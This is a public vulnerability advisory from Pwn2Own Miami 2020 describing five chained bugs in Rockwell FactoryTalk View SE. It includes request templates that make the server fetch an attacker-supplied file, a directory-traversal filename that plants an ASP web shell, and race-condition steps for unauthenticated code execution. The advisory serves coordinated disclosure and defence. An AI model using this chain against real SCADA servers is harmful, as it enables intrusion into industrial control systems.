replicant
=======
***


# Summary

This advisory describes a chain of vulnerabilities that was found by **Pedro Ribeiro ([@pedrib1337](https://twitter.com/pedrib1337) | pedrib@gmail.com)** and **Radek Domanski ([@RabbitPro](https://twitter.com/RabbitPro) | radek.domanski@gmail.com)** in December 2019 / January 2020 and presented in the **Pwn2Own Miami 2020 competition** in January 2020. 

The vulnerabilities described in this document are present in the [Rockwell FactoryTalk View SE](https://www.rockwellautomation.com/en-us/products/software/factorytalk.html) (FactoryTalk) SCADA product, version 11.00.00.230. It is likely that older versions are exploitable, but this has not been confirmed by Rockwell.

The default configuration is exploitable by an unauthenticated attacker, which can **achieve remote code execution as the IIS user on a Windows installation**.

The attack relies on the **chaining of five separate vulnerabilities**, which will be described below. The first vulnerability is a unauthenticated project copy request, the second is a directory traversal, and the third is a race condition. In order to achieve full remote code execution on all targets, two information leak vulnerabilities are also abused.

This advisory will describe the vulnerability details in the order that they were discovered, followed by a list of the exploitation steps necessary to chain them together and achieve unauthenticated remote command execution.

# Note

This advisory was disclosed publicly on 22.06.2020 after [Rockwell issued a patch](https://rockwellautomation.custhelp.com/app/answers/answer_view/a_id/54102) that fixes these vulnerabilities (**we did not test whether the patch fixes the vulnerabilities**).

A special thanks to the [Zero Day Initiative](https://www.zerodayinitiative.com/) (ZDI) for hosting us in the amazing Pwn2Own competition and allowing us to release this information to the public.

This advisory was first published in [ZDI's blog](https://www.zerodayinitiative.com/blog/2020/7/22/chaining-5-bugs-for-code-execution-on-the-rockwell-factorytalk-hmi-at-pwn2own-miami).

A copy of this advisory is available on GitHub at:

* [Pedro's GitHub](https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Miami_2020/replicant/replicant.md)
* [Radek's GitHub](https://github.com/rdomanski/Exploits_and_Advisories/tree/master/advisories/Pwn2Own/Miami2020/replicant.md)

The following CVE numbers have been assigned:

* [CVE-2020-12027](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12027)
* [CVE-2020-12028](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12028)
* [CVE-2020-12029](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12029)

ZDI's advisories can be found at:

* [ZDI-20-727](https://www.zerodayinitiative.com/advisories/ZDI-20-727/)
* [ZDI-20-728](https://www.zerodayinitiative.com/advisories/ZDI-20-728/)
* [ZDI-20-729](https://www.zerodayinitiative.com/advisories/ZDI-20-729/)
* [ZDI-20-730](https://www.zerodayinitiative.com/advisories/ZDI-20-730/)

A Metasploit module was also made available to the public with this advisory, and can be found at:

* [rockwell_factorytalk_rce.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/scada/rockwell_factorytalk_rce.rb)

Click on the thumbnail below to see the video of the Metasploit module in action:

[![replicant video](https://img.youtube.com/vi/PIid0Ql_KmU/0.jpg)](https://www.youtube.com/watch?v=PIid0Ql_KmU)

~ Team FlashBack


# Vulnerability Details

## Background on the target service

FactoryTalk SE exposes several REST endpoints on Microsoft IIS that are accessible remotely. One of these endpoints is at */rsviewse/hmi_isapi.dll*, which is an [ISAPI](https://en.wikipedia.org/wiki/Internet_Server_Application_Programming_Interface) DLL handler that performs a number of actions that deal with FactoryTalk project management.

The ISAPI DLL was loaded and briefly analysed in [Ghidra](https://ghidra-sre.org/) in order to understand its basic functionality. However this turned out to be unnecessary, as all the steps described in this advisory were discovered with a pure black-box penetration testing approach.


## Vulnerability #1: Unauthenticated Project Copy Request

One of the actions implemented by *hmi_isapi.dll* is *StartRemoteProjectCopy*. This can be initiated by issuing an HTTP GET request to:
```
http://<TARGET>/rsviewse/hmi_isapi.dllStartRemoteProjectCopy&<PROJECT_NAME>&<RANDOM_STRING>&<LHOST>
```
> Snippet 1: *StartRemoteProjectCopy* request from `<LHOST>` to `<TARGET>`



In the example above:

* `<TARGET>` refers to the server running FactoryTalk
* `<PROJECT_NAME>` must be an existing project in the server
* `<RANDOM_STRING>` can be any random string as the name implies
* `<LHOST>` is the IP address of the attacker's host

After this request is sent, if `<PROJECT_NAME>` exists on `<TARGET>`, then `<TARGET>` will issue an HTTP GET request to `<LHOST>` as follows:
```
http://<LHOST>/rsviewse/hmi_isapi.dll?BackupHMI&<RNA_ADDRESS>&<PROJECT_NAME>&1&1
```
> Snippet 2: *BackupHMI* request from `<TARGET>` to `<LHOST>`


`<RNA_ADDRESS>` is an internal address scheme used by FactoryTalk; it does not matter for exploitation purposes and can be safely ignored.

In fact, the request content can be completely ignored by `<LHOST>`, which only has to respond with:

```
HTTP/1.1 OK
(...)
<FILENAME>
```
> Snippet 3: *BackupHMI* response from `<LHOST>` to `<TARGET>`


After receiving this response, `<TARGET>` will send a HTTP GET request to the following URL in `<LHOST>`:

```
http://<LHOST>/rsviewse/_bak/<FILENAME>
```
> Snippet 4: *bak* request from `<TARGET>` to `<LHOST>`



To which `<LHOST>` should respond with whatever content it wants to be written to `<FILENAME>` on `<TARGET>`:

```
<FILE_DATA>
```
> Snippet 5: *bak* response from `<LHOST>` to `<TARGET>`



`<TARGET>` will then proceed to write `<FILE_DATA>` to `<FACTORYTALK_HOME>\_bak\<FILENAME>`, perform some actions on it (these actions were not determined since it did not matter for exploitation purposes), and finally delete `<FILENAME>`. All of these actions all occur in less than a second.

The default `<FACTORYTALK_HOME>` for FactoryTalk SE is *`C:\\Users\\Public\\Documents\\RSView Enterprise`*.




## Vulnerability #2: Directory Traversal

Once the first vulnerability was identified, the next objective was to obtain remote code execution. At this point, the data in the file and the filename were completely controllable, but this did not mean it was possible to execute arbitrary code.

The easiest way to achieve RCE is to write a file with ASP or ASPX code to the IIS directory.
This was easily achieved by abusing a directory travesal vulnerability in the `<FILENAME>` provided in **Snippet 3**. If `<LHOST>` responds as in *Snippet 3* with `<FILENAME>` set to:

```
../SE/HMI Projects/shell.asp
```
> Snippet 6: directory traversal response



`<TARGET>` will then write `<FILE_DATA>` (taken from **Snippet 5**) to `<FACTORYTALK_HOME>\\SE\\HMI Projects\\shell.asp`. Since this directory is configured as a virtual directory in IIS, the ASP file will be immediately executed once it is accessed.




## Vulnerability 3: Race Condition

As described previously, `<FILENAME>` is only written and accessed for less than one second, and then immediately deleted. In order to be able to execute the ASP code, the file will need to be accessed as soon as it is written.

This is a classical race condition vulnerability, and exploitation will be explained in the next section.




## Bonus vulnerabilities #4 and #5: Information Leak on *GetHMIProjects* and *GetHMIProjectPaths*

In order to achieve reliable exploitation, it is necessary to know `<PROJECT_NAME>` and its path on the FactoryTalk server. These steps are not necessary for a demonstration proof of concept, but a real weaponized exploit would certainly need them (and our Metasploit exploits implements it).

An unauthenticated attacker can obtain the list of projects by sending the following HTTP GET request to FactoryTalk:

```
http://<TARGET>/rsviewse/hmi_isapi.dll?GetHMIProjects
```
> Snippet 7: *GetHMIProjects* request



FactoryTalk will then respond with:

```
<?xml version="1.0"?>
<!--Generated (Sat Jan 18 04:49:31 2020) by RSView ISAPI Server, Version 11.00.00.230, on Computer: EWS-->
<HMIProjects>
    <HMIProject Name="FTViewDemo_HMI" IsWatcom="0" IsWow64="1" />
</HMIProjects>
```
> Snippet 8: *GetHMIProjects* response



The project name is clearly visible in the XML, and after it is extracted it can then be used in a subsequent request that will show the project's path:

```
http://<TARGET>/rsviewse/hmi_isapi.dll?GetHMIProjectPath&<PROJECT_NAME>
```
> Snippet 9: *GetHMIProjectPath* request



The response will contain the full path of the project:

```
C:\Users\Public\Documents\RSView Enterprise\SE\HMI Projects\FTViewDemo_HMI
```
> Snippet 10: *GetHMIProjectPath* response



The returned path can then be used to calculate the correct directory traversal needed to deploy the ASP file that will be used to achieve remote code execution.




# Exploitation
## Chaining everything together

In order to exploit the three vulnerabilities described above and achieve remote code execution on FactoryTalk, the exploit does the following in order:

1. Obtain a list of projects in the server
2. Fetch the actual directory of the project to calculate the correct directory traversal path
3. Start a HTTP server, ready to answer the requests from FactoryTalk as explained in the previous section
4. Start a thread that continuously tries to access the path to which the malicious ASP file will be created
5. Issue the requests described in the previous section to initiate the remote project copy

After the requests described previously are sent, the exploit will respond with the ASP code, which will be fetched by FactoryTalk, written to the location specified and then immediately accessed by the thread that issues constant requests, therefore "winning" the race condition and executing the ASP code as the IIS user.
